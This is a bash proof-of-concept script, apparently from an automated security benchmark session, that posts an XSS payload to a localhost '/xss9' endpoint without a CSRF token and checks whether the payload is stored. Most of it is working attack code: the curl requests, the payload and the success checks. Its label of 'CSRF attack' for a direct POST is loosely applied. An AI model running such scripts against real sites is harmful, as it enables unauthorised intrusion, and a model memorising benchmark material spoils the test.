#!/bin/bash
# POC: CSRF attack POC on /xss9 endpoint - demonstrates lack of CSRF token validation by submitting malicious payload without user consent
# Target: ./repo
# Created: 2025-11-07T19:16:11.704Z
# Session: benchmark-XBEN-064-24-mhp85ykb

# CSRF Attack POC on /xss9 Endpoint
# This script simulates a CSRF attack by submitting a malicious form to the vulnerable endpoint
# without any CSRF token, proving that the endpoint has no CSRF protection

TARGET_URL="http://localhost:5000"
ENDPOINT="/xss9"
FULL_URL="${TARGET_URL}${ENDPOINT}"

# First, establish a session by accessing the endpoint
echo "[*] Step 1: Establishing session by accessing the target endpoint..."
SESSION_RESPONSE=$(curl -s -c /tmp/csrf_cookies.txt -b /tmp/csrf_cookies.txt "${FULL_URL}")

# Check if we got a valid response
if [ -z "$SESSION_RESPONSE" ]; then
    echo "[-] Failed to connect to ${FULL_URL}"
    exit 1
fi

echo "[+] Session established"
echo ""

# Now attempt a CSRF attack: submit a malicious payload without CSRF token
echo "[*] Step 2: Attempting CSRF attack - submitting malicious payload without CSRF token..."

MALICIOUS_PAYLOAD='<img src=x onerror="alert(1)">'

# This demonstrates that we can POST to the endpoint without any CSRF protection
CSRF_ATTACK_RESPONSE=$(curl -s -X POST \
    -b /tmp/csrf_cookies.txt \
    -c /tmp/csrf_cookies.txt \
    -d "solution=${MALICIOUS_PAYLOAD}" \
    -w "\n%{http_code}" \
    "${FULL_URL}")

# Extract HTTP status code
HTTP_CODE=$(echo "$CSRF_ATTACK_RESPONSE" | tail -n 1)
RESPONSE_BODY=$(echo "$CSRF_ATTACK_RESPONSE" | head -n -1)

echo "[*] HTTP Response Code: $HTTP_CODE"
echo ""

# Check for CSRF token validation failure
if [ "$HTTP_CODE" = "200" ] || [ "$HTTP_CODE" = "302" ]; then
    echo "[+] VULNERABILITY CONFIRMED: The endpoint accepted the POST request without CSRF token validation"
    echo "[+] Response Code: $HTTP_CODE indicates successful submission"
    echo ""
    echo "[*] Step 3: Verify that the payload was processed..."
    
    # Try to access the endpoint and see if our payload appears in the response
    VERIFICATION=$(curl -s "${FULL_URL}")
    
    if echo "$VERIFICATION" | grep -q '<img src=x onerror="alert(1)">' || echo "$VERIFICATION" | grep -q '<img src=x onerror='; then
        echo "[+] CRITICAL: Malicious payload found in response - CSRF attack successful!"
        echo "[+] Payload persisted in the application"
    else
        # Even if not displayed, the fact that POST succeeded without token is the issue
        echo "[+] POST request was accepted without CSRF token validation"
    fi
    
    echo ""
    echo "[*] Attack Summary:"
    echo "    - Target: $FULL_URL"
    echo "    - Method: POST without CSRF token"
    echo "    - Payload: $MALICIOUS_PAYLOAD"
    echo "    - Result: Request accepted (HTTP $HTTP_CODE)"
    echo ""
    echo "[!] CONCLUSION: The endpoint is vulnerable to CSRF attacks"
    exit 0
else
    echo "[-] Unexpected response code: $HTTP_CODE"
    echo "Response: $RESPONSE_BODY"
    exit 1
fi